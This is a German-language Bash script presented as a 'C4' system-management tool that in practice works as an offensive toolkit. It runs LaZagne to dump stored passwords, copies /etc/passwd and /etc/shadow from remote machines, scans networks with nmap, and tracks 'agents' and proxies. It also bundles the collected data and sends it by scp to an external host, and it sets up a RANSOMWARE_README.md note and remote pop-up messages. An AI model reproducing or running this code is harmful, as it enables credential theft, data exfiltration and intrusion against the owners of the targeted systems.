#!/bin/bash

# ===============================================
# C4 E-Waffen Management Script
# ===============================================
# Beschreibung: Dieses Skript bietet verschiedene 
#               Funktionen zur Verwaltung von
#               Systemen, inklusive Sammeln von
#               Informationen, Durchführung von 
#               Netzwerkscans, Datensicherung, 
#               Alarmierung und mehr.
#
# Autor: [Dein Name]
# Datum: [Aktuelles Datum]
# ===============================================

# ===============================================
# Farben für die Ausgabe
# ===============================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# ===============================================
# Verzeichnisse und Dateien
# ===============================================
output_dir="/home/lokaluser/C4_Shellscript/outputs"
backup_dir="/home/lokaluser/C4_Shellscript/backups/Backup_$(hostname)"
remote_user="root"
remote_host="https://gateway-fritz.ddnss.de:38131"
remote_backup_dir="/tmp/backup"
ssh_key="/home/lokaluser/.ssh"
proxy_list_file="$output_dir/proxy_list.txt"
lazagne_dir="$output_dir/LaZagne"
lazagne_script="laZagne.py"
alert_file="RANSOMWARE_README.md"
aufklaerung_dir="$output_dir/Aufklärung"

# ===============================================
# Status-Variablen
# ===============================================
c4_server_status="Disconnected"
c4_database_status="Disconnected"
c4_agent_status="Disconnected"
proxy_status="Disconnected"
last_c4_connection=""

# ===============================================
# Menü anzeigen
# ===============================================
function show_menu() {
    clear
    echo -e "${BLUE}"
    echo "  ██████╗██╗  ██╗    ███████╗      ██╗    ██╗ █████╗ ███████╗███████╗███████╗███╗   ██╗"
    echo " ██╔════╝██║  ██║    ██╔════╝      ██║    ██║██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║"
    echo " ██║     ███████║    █████╗  █████╗██║ █╗ ██║███████║█████╗  █████╗  █████╗  ██╔██╗ ██║"
    echo " ██║     ╚════██║    ██╔══╝  ╚════╝██║███╗██║██╔══██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║"
    echo " ╚██████╗     ██║    ███████╗      ╚███╔███╔╝██║  ██║██║     ██║     ███████╗██║ ╚████║"
    echo "  ╚═════╝     ╚═╝    ╚══════╝       ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝"
    echo -e "${RESET}"
    echo "======================================================================================="
    echo -e "   C4-Server: ${c4_server_status}   |   C4-Datenbank: ${c4_database_status}   |   Agenten: ${c4_agent_status}   |   Proxy: ${proxy_status}"
    echo "======================================================================================="
    echo "1. Systeminformationen sammeln"
    echo "2. Nmap-Scan ausführen"
    echo "3. Remote-Daten sammeln"
    echo "4. Kryptographie"
    echo "5. C4-Server Management"
    echo "6. Backup erstellen und senden"
    echo "7. Alarmanlage einrichten"
    echo "8. Systemkonfiguration"
    echo "9. Aufklärung"
    echo "10. Anzeige ändern"
    echo "11. Beenden"
    echo "=============================="
}

# ===============================================
# Funktion zum Sammeln von Systeminformationen
# ===============================================
function collect_sysinfo() {
    echo -e "${BLUE}Sammle Systeminformationen...${RESET}"
    mkdir -p "$output_dir"
    sysinfo_file="$output_dir/system_info.txt"

    echo "Hostname: $(hostname)" > "$sysinfo_file"
    echo "Betriebssystem: $(uname -a)" >> "$sysinfo_file"
    echo "CPU-Informationen: $(lscpu)" >> "$sysinfo_file"
    echo "Speicherinformationen: $(free -h)" >> "$sysinfo_file"
    echo "Festplatteninformationen: $(df -h)" >> "$sysinfo_file"

    # Netzwerk-Informationen sammeln
    if command -v ifconfig &> /dev/null
    then
        echo "Netzwerkkonfiguration: $(ifconfig)" >> "$sysinfo_file"
    else
        echo "Netzwerkkonfiguration: $(ip a)" >> "$sysinfo_file"
    fi

    echo "Installierte Software: $(dpkg -l)" >> "$sysinfo_file"
    echo "Angemeldete Benutzer: $(who)" >> "$sysinfo_file"
    echo "Umgebungsvariablen: $(env)" >> "$sysinfo_file"

    echo -e "${GREEN}Systeminformationen gesammelt und in ${sysinfo_file} gespeichert.${RESET}"

    # LaZagne installieren und ausführen
    echo -e "${BLUE}Installiere und führe LaZagne aus...${RESET}"

    if [ ! -d "$lazagne_dir" ] || [ -z "$(ls -A $lazagne_dir)" ]; then
        git clone https://github.com/AlessandroZ/LaZagne.git "$lazagne_dir"
        cd "$lazagne_dir/Linux" && pip3 install -r requirements.txt && cd -
    else
        echo -e "${YELLOW}LaZagne ist bereits installiert.${RESET}"
    fi

    os_name=$(uname -s)
    case $os_name in
        Linux*) lazagne_path="$lazagne_dir/Linux/$lazagne_script" ;;
        Darwin*) lazagne_path="$lazagne_dir/mac/$lazagne_script" ;;
        CYGWIN*|MINGW*|MSYS*) lazagne_path="$lazagne_dir/Windows/$lazagne_script" ;;
        *) echo -e "${RED}Unsupported OS: $os_name${RESET}"; return ;;
    esac

    python3 "$lazagne_path" all > "$output_dir/lazagne_output.txt"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Passwörter mit LaZagne gesammelt und in ${output_dir}/lazagne_output.txt gespeichert.${RESET}"
    else
        echo -e "${RED}Fehler beim Ausführen von LaZagne.${RESET}"
    fi

    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zum Ausführen eines Nmap-Scans
# ===============================================
function perform_nmap_scan() {
    read -p "Gib die Ziel-IP oder das Netzwerk für den Nmap-Scan ein: " target
    echo -e "${BLUE}Führe Nmap-Scan auf ${target} aus...${RESET}"
    nmap_output_file="$output_dir/nmap_scan.txt"
    nmap -A "$target" > "$nmap_output_file"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Nmap-Scan abgeschlossen und in ${nmap_output_file} gespeichert.${RESET}"
    else
        echo -e "${RED}Fehler beim Ausführen des Nmap-Scans.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zum Sammeln von Remote-Daten
# ===============================================
function collect_remote_data() {
    read -p "Gib die IP-Adresse des Remote-Systems ein: " remote_ip
    read -p "Gib den SSH-Benutzernamen ein: " ssh_user

    echo -e "${BLUE}Sammle Remote-Daten von ${ssh_user}@${remote_ip}...${RESET}"
    remote_output_dir="$output_dir/remote_data_${remote_ip}"
    mkdir -p "$remote_output_dir"

    scp -i "$ssh_key" "$ssh_user@$remote_ip:/etc/passwd" "$remote_output_dir/passwd"
    scp -i "$ssh_key" "$ssh_user@$remote_ip:/etc/shadow" "$remote_output_dir/shadow"

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Remote-Daten erfolgreich gesammelt und in ${remote_output_dir} gespeichert.${RESET}"
    else
        echo -e "${RED}Fehler beim Sammeln von Remote-Daten.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Verschlüsselung mit OpenSSL
# ===============================================
function cryptography() {
    echo -e "${BLUE}Wähle eine Option zur Verschlüsselung:${RESET}"
    echo "1. Text verschlüsseln"
    echo "2. Text entschlüsseln"
    echo "=============================="
    read -p "Option: " crypto_option

    case $crypto_option in
        1)
            read -p "Gib den Text zur Verschlüsselung ein: " plaintext
            echo "$plaintext" | openssl enc -aes-256-cbc -a -salt -out "$output_dir/encrypted.txt"
            echo -e "${GREEN}Text verschlüsselt und in ${output_dir}/encrypted.txt gespeichert.${RESET}"
            ;;
        2)
            openssl enc -aes-256-cbc -d -a -in "$output_dir/encrypted.txt" -out "$output_dir/decrypted.txt"
            echo -e "${GREEN}Text entschlüsselt und in ${output_dir}/decrypted.txt gespeichert.${RESET}"
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac

    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur C4-Server-Verwaltung
# ===============================================
function c4_server_management() {
    echo -e "${BLUE}C4-Server Management${RESET}"
    echo "1. C4-Server verbinden"
    echo "2. C4-Server installieren"
    echo "3. C4-Server starten"
    echo "4. C4-Datenbank verbinden"
    echo "5. C4-Agenten und Proxy verwalten"
    echo "=============================="
    read -p "Option: " c4_option

    case $c4_option in
        1) connect_c4_server ;;
        2) install_c4_server ;;
        3) start_c4_server ;;
        4) connect_c4_database ;;
        5) manage_agents_and_proxy ;;
        *) echo -e "${RED}Ungültige Option!${RESET}" ;;
    esac
}

# Funktion zur Verbindung mit dem C4-Server
function connect_c4_server() {
    echo -e "${BLUE}C4-Server verbinden:${RESET}"
    echo "1. Server mittels Netzwerk-Protokoll verbinden"
    echo "2. Letzte funktionierende Verbindung nutzen"
    echo "=============================="
    read -p "Option: " connect_option

    case $connect_option in
        1)
            read -p "Gib die Server-IP ein: " server_ip
            read -p "Gib den SSH-Benutzernamen ein: " ssh_user
            ssh -i "$ssh_key" "$ssh_user@$server_ip"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}Verbindung zum C4-Server erfolgreich.${RESET}"
                c4_server_status="Verbunden ($server_ip)"
                last_c4_connection="$ssh_user@$server_ip"
            else
                echo -e "${RED}Fehler bei der Verbindung zum C4-Server.${RESET}"
            fi
            ;;
        2)
            if [ -z "$last_c4_connection" ]; then
                echo -e "${RED}Keine letzte funktionierende Verbindung gefunden.${RESET}"
            else
                ssh -i "$ssh_key" "$last_c4_connection"
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Verbindung zum C4-Server erfolgreich.${RESET}"
                    c4_server_status="Verbunden ($last_c4_connection)"
                else
                    echo -e "${RED}Fehler bei der Verbindung zum C4-Server.${RESET}"
                fi
            fi
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# Funktion zur Installation des C4-Servers
function install_c4_server() {
    echo -e "${BLUE}C4-Server Installation:${RESET}"
    echo "1. Lokal installieren"
    echo "2. Remote installieren"
    echo "=============================="
    read -p "Option: " install_option

    case $install_option in
        1)
            echo -e "${BLUE}Installiere C4-Server lokal...${RESET}"
            # Hier fügst du die Befehle zur Installation des Servers lokal ein
            sudo apt-get update
            sudo apt-get install -y apache2 mysql-server
            echo -e "${GREEN}C4-Server erfolgreich lokal installiert.${RESET}"
            ;;
        2)
            read -p "Gib die Remote-IP ein: " remote_ip
            read -p "Gib den SSH-Benutzernamen ein: " ssh_user
            echo -e "${BLUE}Installiere C4-Server auf Remote-System...${RESET}"
            # Hier fügst du die Befehle zur Installation des Servers auf dem Remote-System ein
            ssh -i "$ssh_key" "$ssh_user@$remote_ip" "sudo apt-get update && sudo apt-get install -y apache2 mysql-server"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}C4-Server erfolgreich auf Remote-System installiert.${RESET}"
            else
                echo -e "${RED}Fehler bei der Installation auf dem Remote-System.${RESET}"
            fi
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# Funktion zum Starten des C4-Servers
function start_c4_server() {
    echo -e "${BLUE}Starte C4-Server...${RESET}"
    if [ "$c4_server_status" = "Disconnected" ]; then
        echo -e "${YELLOW}Keine Verbindung zum C4-Server. Verbinde zuerst...${RESET}"
        connect_c4_server
    fi
    if [ "$c4_server_status" != "Disconnected" ]; then
        echo -e "${BLUE}Starte alle erforderlichen Dienste...${RESET}"
        # Hier fügst du die Befehle zum Starten der Dienste ein
        sudo systemctl start apache2
        sudo systemctl start mysql
        echo -e "${GREEN}C4-Server und Dienste erfolgreich gestartet.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# Funktion zur Verbindung mit der C4-Datenbank
function connect_c4_database() {
    echo -e "${BLUE}C4-Datenbank verbinden...${RESET}"
    read -p "Gib die IP der C4-Datenbank ein: " db_ip
    read -p "Gib den Datenbankbenutzernamen ein: " db_user
    read -p "Gib das Passwort ein: " db_password

    mysql -h "$db_ip" -u "$db_user" -p"$db_password" -e "SHOW DATABASES;"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Erfolgreich mit der C4-Datenbank verbunden.${RESET}"
        c4_database_status="Verbunden ($db_ip)"
    else
        echo -e "${RED}Fehler bei der Verbindung zur C4-Datenbank.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# Funktion zur Verwaltung von Agenten und Proxy
function manage_agents_and_proxy() {
    echo -e "${BLUE}C4-Agenten und Proxy Verwaltung${RESET}"
    echo "1. Proxy hinzufügen"
    echo "2. Agentenstatus anzeigen"
    echo "=============================="
    read -p "Option: " agent_option

    case $agent_option in
        1)
            read -p "Gib die Proxy-Adresse ein: " proxy_address
            echo "$proxy_address" >> "$proxy_list_file"
            echo -e "${GREEN}Proxy hinzugefügt: $proxy_address${RESET}"
            proxy_status="Verbunden"
            ;;
        2)
            echo -e "${YELLOW}Anzahl verbundener Agenten: $(grep -c '^' "$proxy_list_file")${RESET}"
            # Weitere Informationen über die Agenten können hier angezeigt werden
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Backup-Erstellung und zum Senden
# ===============================================
function create_and_send_backup() {
    echo -e "${BLUE}Erstelle Backup...${RESET}"
    mkdir -p "$backup_dir"
    tar -czvf "$backup_dir/backup_$(date +%F).tar.gz" "$output_dir"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Backup erfolgreich erstellt: ${backup_dir}/backup_$(date +%F).tar.gz${RESET}"
    else
        echo -e "${RED}Fehler beim Erstellen des Backups.${RESET}"
    fi

    echo -e "${BLUE}Sende Backup an Remote-System...${RESET}"
    scp -i "$ssh_key" "$backup_dir/backup_$(date +%F).tar.gz" "$remote_user@$remote_host:$remote_backup_dir"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Backup erfolgreich an Remote-System gesendet.${RESET}"
    else
        echo -e "${RED}Fehler beim Senden des Backups.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Einrichtung der Alarmanlage
# ===============================================
function setup_alarm_system() {
    echo -e "${BLUE}Alarmanlage einrichten${RESET}"
    echo "1. README.md erstellen"
    echo "2. Background ändern"
    echo "3. Fenster erstellen und auf Remotesystem öffnen"
    echo "=============================="
    read -p "Option: " alarm_option

    case $alarm_option in
        1)
            read -p "Gib den Text für die README.md ein: " readme_text
            echo "$readme_text" > "$output_dir/$alert_file"
            echo -e "${GREEN}README.md erstellt.${RESET}"
            ;;
        2)
            read -p "Gib den neuen Hintergrundtext ein: " background_text
            echo "$background_text" > "$output_dir/background.txt"
            echo -e "${GREEN}Hintergrund geändert.${RESET}"
            ;;
        3)
            read -p "Gib den Text für das Fenster ein: " window_text
            echo "$window_text" | ssh -i "$ssh_key" "$remote_user@$remote_host" "cat > /tmp/message.txt && xmessage -file /tmp/message.txt"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}Fenster auf dem Remotesystem erfolgreich geöffnet.${RESET}"
            else
                echo -e "${RED}Fehler beim Öffnen des Fensters auf dem Remotesystem.${RESET}"
            fi
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Systemkonfiguration
# ===============================================
function system_configuration() {
    echo -e "${BLUE}Systemkonfiguration${RESET}"
    read -p "Gib den Konfigurationsbefehl ein: " config_cmd
    eval "$config_cmd"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Systemkonfiguration erfolgreich ausgeführt.${RESET}"
    else
        echo -e "${RED}Fehler bei der Systemkonfiguration.${RESET}"
    fi
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Aufklärung
# ===============================================
function reconnaissance() {
    echo -e "${BLUE}Aufklärung${RESET}"
    mkdir -p "$aufklaerung_dir"
    read -p "Gib den Domainnamen oder die IP-Adresse ein: " target
    whois "$target" > "$aufklaerung_dir/whois_$target.txt"
    dig "$target" > "$aufklaerung_dir/dig_$target.txt"
    nslookup "$target" > "$aufklaerung_dir/nslookup_$target.txt"
    echo -e "${GREEN}Aufklärungsdaten gesammelt und in ${aufklaerung_dir} gespeichert.${RESET}"
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Funktion zur Anzeigeänderung
# ===============================================
function change_display() {
    echo -e "${BLUE}Anzeige ändern${RESET}"
    echo "1. Status der verbundenen Agenten anzeigen"
    echo "2. Status der verlorenen Agenten anzeigen"
    echo "=============================="
    read -p "Option: " display_option

    case $display_option in
        1)
            echo -e "${YELLOW}Anzahl verbundener Agenten: $(grep -c '^' "$proxy_list_file")${RESET}"
            ;;
        2)
            echo -e "${YELLOW}Anzahl verlorener Agenten: $(grep -c '^' "$proxy_list_file")${RESET}"
            ;;
        *)
            echo -e "${RED}Ungültige Option!${RESET}"
            ;;
    esac
    read -p "Drücke Enter, um zum Hauptmenü zurückzukehren..."
}

# ===============================================
# Hauptschleife des Skripts
# ===============================================
while true
do
    show_menu
    read -p "Wähle eine Option: " option
    case $option in
        1) collect_sysinfo ;;
        2) perform_nmap_scan ;;
        3) collect_remote_data ;;
        4) cryptography ;;
        5) c4_server_management ;;
        6) create_and_send_backup ;;
        7) setup_alarm_system ;;
        8) system_configuration ;;
        9) reconnaissance ;;
        10) change_display ;;
        11) echo -e "${GREEN}Beenden...${RESET}"; exit ;;
        *) echo -e "${RED}Ungültige Option! Bitte wähle erneut.${RESET}" ;;
    esac
done
